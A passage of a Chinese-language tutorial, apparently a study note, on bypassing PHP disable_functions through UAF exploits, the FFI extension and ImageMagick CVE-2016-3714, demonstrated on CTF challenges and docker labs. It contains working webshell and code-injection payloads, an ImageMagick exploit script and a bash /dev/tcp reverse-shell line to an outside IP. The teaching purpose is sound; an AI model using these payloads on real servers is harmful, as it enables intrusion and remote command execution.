![image-20210525162150663](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525162152.png)

### 2.7.4 利用蚁剑中的`PHP_GC_UAF`

在蚁剑中有该绕过`disable_functions`的插件：

![image-20210525162401355](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525162402.png)

点击开始按钮后，成功之后会创建一个新的虚拟终端，在这个新的虚拟终端中即可执行命令了。

## 2.8 利用 `PHP_Backtrace_UAF`

### 2.8.1 使用条件

1. Linux 操作系统

2. PHP 版本

   7.0 - all versions to date

   7.1 - all versions to date

   7.2 - all versions to date

   7.3 < 7.3.15 (released 20 Feb 2020)

   7.4 < 7.4.3 (released 20 Feb 2020)

### 2.8.2 原理简述

该漏洞利用在debug_backtrace()函数中使用了两年的一个 bug。我们可以诱使它返回对已被破坏的变量的引用，从而导致释放后使用漏洞。

利用脚本：https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass

### 2.8.3 利用方法

利用方法和`PHP_GC_UAF`绕过disable_functions相同。下载利用脚本后先对脚本像上面那样进行修改，然后将修改后的利用脚本上传到目标主机上，如果是web目录则直接传参执行命令，如果是其他有权限的目录，则将脚本包含进来再传参执行命令。

## 2.9 利用 `Json_Serializer_UAF`

### 2.9.1 使用条件

1. Linux 操作系统

2. PHP 版本

   7.1 - all versions to date

   7.2 < 7.2.19 (released: 30 May 2019)

   7.3 < 7.3.6 (released: 30 May 2019)

### 2.9.2 原理简述

此漏洞利用json序列化程序中的释放后使用漏洞，利用json序列化程序中的堆溢出触发，以绕过 `disable_functions` 和执行系统命令。尽管不能保证成功，但它应该相当可靠的在所有服务器 api上使用。

利用脚本：https://github.com/mm0r1/exploits/tree/master/php-json-bypass

### 2.9.3 利用方法

利用方法和其他的UAF绕过disable_functions相同。下载利用脚本后先对脚本像上面那样进行修改，然后将修改后的利用脚本上传到目标主机上，如果是web目录则直接传参执行命令，如果是其他有权限的目录，则将脚本包含进来再传参执行命令。

我们利用 AntSword-Labs 项目来搭建环境：

```
git clone https://github.com/AntSwordProject/AntSword-Labs.git
cd AntSword-Labs/bypass_disable_functions/6
docker-compose up -d
```

搭建完成后访问 http://your-ip:18080：

![image-20210525163256881](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525163258.png)

拿到shell后无法执行命令：

![image-20210525163337915](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525163340.png)

查看phpinfo确定是设置了disable_functions：

![image-20210525163457783](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525163500.png)

首先我们下载利用脚本：https://github.com/mm0r1/exploits/tree/master/php-json-bypass

下载后，像之前那样对脚本稍作修改：

![image-20210525163522376](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525163524.png)

将脚本像之前那样上传到有权限的目录（/var/tmp/exploit.php）后包含执行即可：

```
/?ant=include("/var/tmp/exploit.php");
POST: whoami=ls /
```

如下图所示，成功执行命令：

![image-20210525163609062](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525163610.png)

### 2.7.4 利用蚁剑中的`Json_Serializer_UAF`

在蚁剑中有也该绕过disable_functions的插件：

![image-20210525163717289](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525163719.png)

点击开始按钮后，成功之后会创建一个新的虚拟终端，在这个新的虚拟终端中即可执行命令了。

## 2.10 利用 `SplDoublyLinkedList_UAC`

### 2.10.1 使用条件

PHP 版本

​	PHP v7.4.10及其之前版本

​	PHP v8.0（Alpha）

引用官方的一句话，你细品：“PHP 5.3.0 to PHP 8.0 (alpha) are vulnerable, that is every PHP version since the creation of the class. The given exploit works for PHP7.x only, due to changes in internal PHP structures.”

### 2.10.2 原理简述

2020年9月20号有人在 bugs.php.net 上发布了一个新的 UAF BUG ，报告人已经写出了 bypass disabled functions 的利用脚本并且私发了给官方，不过官方似乎还没有修复，原因不明。

PHP的SplDoublyLinkedList双向链表库中存在一个用后释放漏洞，该漏洞将允许攻击者通过运行PHP代码来转义disable_functions限制函数。在该漏洞的帮助下，远程攻击者将能够实现PHP沙箱逃逸，并执行任意代码。更准确地来说，成功利用该漏洞后，攻击者将能够绕过PHP的某些限制，例如disable_functions和safe_mode等等。

详情请看：https://www.freebuf.com/articles/web/251017.html

### 2.10.3 利用方法

我们通过这道题 [2020 第一届BMZCTF公开赛]ezphp 来演示一下利用 SplDoublyLinkedList UAC 来绕过disable_functions的具体方法。

进入题目，给出源码：

![image-20210525164028578](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525164030.png)

可知，我们传入的payload长度不能大于25，我们可以用以下方法来绕过长度限制：

```
a=eval($_POST[1]);&1=system('ls /');
```

发现没反应：

![image-20210525164135052](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525164136.png)

直接连接蚁剑：

![image-20210525164251942](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525164253.png)

连接成功后依然是没法执行命令：

![image-20210525164332614](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525164333.png)

很有可能是题目设置了disable_functions来限制了一些命令执行函数，我们执行phpinfo看一下：

![image-20210525164421970](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525164426.png)

发现确实限制了常用的命令执行函数，需要我们进行绕过。

然后我们需要下载一个利用脚本：https://xz.aliyun.com/t/8355#toc-3

![image-20210525164450543](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525164648.png)

将脚本上传到目标主机上有权限的目录中（/var/tmp/exploit.php），包含该exploit.php脚本即可成功执行命令：

![image-20210525164715013](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525164921.png)

## 2.11 利用 FFI 扩展执行命令

### 2.11.1 使用条件

- Linux 操作系统
- PHP >= 7.4
- 开启了 FFI 扩展且 `ffi.enable=true`

### 2.11.2 原理简述

PHP 7.4 的 FFI（Foreign Function Interface），即外部函数接口，允许从用户在PHP代码中去调用C代码。

FFI的使用非常简单，只用声明和调用两步就可以。

首先我们使用 `FFI::cdef()` 函数在PHP中声明一个我们要调用的这个C库中的函数以及使用到的数据类型，类似如下：

```
$ffi = FFI::cdef("int system(char* command);");   # 声明C语言中的system函数
```

这将返回一个新创建的FFI对象，然后使用以下方法即可调用这个对象中所声明的函数：

```
$ffi ->system("ls / > /tmp/res.txt");   # 执行ls /命令并将结果写入/tmp/res.txt
```

由于system函数执行命令无回显，所以需要将执行结果写入到tmp等有权限的目录中，最后再使用 `echo file_get_contents("/tmp/res.txt");` 查看执行结果即可。

可见，当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数或其他能实现我们需求的函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。

### 2.11.3 利用方法

下面，我们通过 [极客大挑战 2020]FighterFightsInvincibly 这道题来演示利用PHP 7.4 FFI来突破disable_functions的具体方法。

进入题目：

![image-20210525165048861](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525165050.png)

查看源码发现提示：

![image-20210525165112463](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525165113.png)

```
$_REQUEST['fighter']($_REQUEST['fights'],$_REQUEST['invincibly']);
```

可以动态的执行php代码，此刻应该联想到`create_function`代码注入：

```
create_function(string $args,string $code)
//string $args 声明的函数变量部分
//string $code 执行的方法代码部分
```

我们令 `fighter=create_function`，`invincibly=;}eval($_POST[whoami]);/*` 即可注入恶意代码并执行。

payload：

```
/?fighter=create_function&fights=&invincibly=;}eval($_POST[whoami]);/*
```

使用蚁剑成功连接，但是无法访问其他目录也无法执行命令：

![image-20210525165229030](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525165230.png)

![image-20210525165239276](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525165240.png)

很有可能是题目设置了disable_functions，我们执行一下phpinfo()看看：

```
/?fighter=create_function&fights=&invincibly=;}phpinfo();/*
```

发现果然用disable_functions禁用了很多函数：

![image-20210525165319375](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525165320.png)

根据题目名字的描述，应该是让我们使用PHP 7.4 的FFI绕过disabled_function，并且我们在phpinfo中也看到FFI处于enable状态：

![image-20210525165347743](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525165349.png)

#### 2.11.3.1 利用FFI调用C库的system函数

我们首先尝试调用C库的system函数：

```
/?fighter=create_function&fights=&invincibly=;}$ffi = FFI::cdef("int system(const char *command);");$ffi->system("ls / > /tmp/res.txt");echo file_get_contents("/tmp/res.txt");/*
```

C库的system函数执行是没有回显的，所以需要将执行结果写入到tmp等有权限的目录中，最后再使用 `echo file_get_contents("/tmp/res.txt");` 查看执行结果即可。

但是这道题执行后却发现有任何结果，可能是我们没有写文件的权限。尝试反弹shell：

```
/?fighter=create_function&fights=&invincibly=;}$ffi = FFI::cdef("int system(const char *command);");$ffi->system('bash -c "bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1"')/*
```

但这里也失败了，可能还是权限的问题。所以，我们还要找别的C库函数。

#### 2.11.3.2 利用FFI调用C库的popen函数

C库的system函数调用shell命令，只能获取到shell命令的返回值，而不能获取shell命令的输出结果，如果想获取输出结果我们可以用popen函数来实现：

```
FILE *popen(const char* command, const char* type);
```

popen()函数会调用fork()产生子进程，然后从子进程中调用 /bin/sh -c 来执行参数 command 的指令。

参数 type 可使用 "r"代表读取，"w"代表写入。依照此type值，popen()会建立管道连到子进程的标准输出设备或标准输入设备，然后返回一个文件指针。随后进程便可利用此文件指针来读取子进程的输出设备或是写入到子进程的标准输入设备中。

所以，我们还可以利用C库的popen()函数来执行命令，但要读取到结果还需要C库的fgetc等函数。payload如下：

```
/?fighter=create_function&fights=&invincibly=;}$ffi = FFI::cdef("void *popen(char*,char*);void pclose(void*);int fgetc(void*);","libc.so.6");$o = $ffi->popen("ls /","r");$d = "";while(($c = $ffi->fgetc($o)) != -1){$d .= str_pad(strval(dechex($c)),2,"0",0);}$ffi->pclose($o);echo hex2bin($d);/*
```

成功执行命令：

![image-20210525165546207](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525165548.png)

#### 2.11.3.3 利用FFI调用PHP源码中的函数

其次，我们还有一种思路，即FFI中可以直接调用php源码中的函数，比如这个php_exec()函数就是php源码中的一个函数，当他参数type为3时对应着调用的是passthru()函数，其执行命令可以直接将结果原始输出，payload如下：

```
/?fighter=create_function&fights=&invincibly=;}$ffi = FFI::cdef("int php_exec(int type, char *cmd);");$ffi->php_exec(3,"ls /");/*
```

成功执行命令：

![image-20210525165656195](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525165657.png)

### 2.11.4 利用蚁剑中的`PHP74_FFI`

在蚁剑中有该绕过disable_functions的插件：

![image-20210525165813066](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525165814.png)

点击开始按钮后，成功之后, 会创建一个新的虚拟终端，在这个新的虚拟终端中即可执行命令了。

## 2.12 利用 ImageMagick

### 2.12.1 使用条件

- 目标主机安装了漏洞版本的imagemagick（<= 3.3.0）
- 安装了php-imagick拓展并在php.ini中启用；
- 编写php通过new Imagick对象的方式来处理图片等格式文件；
- PHP >= 5.4

### 2.12.2 原理简述

imagemagick是一个用于处理图片的程序，它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转。

利用ImageMagick绕过disable_functions的方法利用的是ImageMagick的一个漏洞（CVE-2016-3714）。漏洞的利用过程非常简单，只要将精心构造的图片上传至使用漏洞版本的ImageMagick，ImageMagick会自动对其格式进行转换，转换过程中就会执行攻击者插入在图片中的命令。因此很多具有头像上传、图片转换、图片编辑等具备图片上传功能的网站都可能会中招。所以如果在phpinfo中看到有这个ImageMagick，可以尝试一下。

### 2.12.3 利用方法

我们使用网上已有的docker镜像来搭建环境：

```
docker pull medicean/vulapps:i_imagemagick_1
docker run -d -p 8000:80 --name=i_imagemagick_1 medicean/vulapps:i_imagemagick_1
```

启动环境后，访问 http://your-ip:8000 端口：

![image-20210525170414227](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525170416.png)

假设此时目标主机仍然设置了disable_functions只是我们无法执行命令，并且查看phpinfo发现其安装并开启了ImageMagick拓展：

![image-20210525170438822](https://cdn.jsdelivr.net/gh/Qiangshen01/SecurityLearning/Web/bypass/Disable_functions/images_20210525170528.png)

此时我们便可以通过攻击ImageMagick绕过disable_functions来执行命令。

将一下利用脚本上传到目标主机上有权限的目录（/var/tmp/exploit.php）：

```php
<?php
echo "Disable Functions: " . ini_get('disable_functions') . "\n";
$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];
if ($command == '') {
   $command = 'id';
}
$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|$command")'
pop graphic-context
EOF;
file_put_contents("KKKK.mvg", $exploit);
$thumb = new Imagick();
$thumb->readImage('KKKK.mvg');
$thumb->writeImage('KKKK.png');
$thumb->clear();
$thumb->destroy();
unlink("KKKK.mvg");
unlink("KKKK.png");
?>
```

# 0X03 参考

https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD

https://www.anquanke.com/post/id/208451

https://www.anquanke.com/post/id/193117

https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html

[https://mp.weixin.qq.com/s/VR8byhVnebgSEspwtPhhRg](https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652474031&idx=1&sn=14bd6796e8f8b5dd2b8b5b35cfe50f45&scene=21#wechat_redirect)

https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions

https://mp.weixin.qq.com/s/lPQ_sITvL40L8vo_-Ol5dA
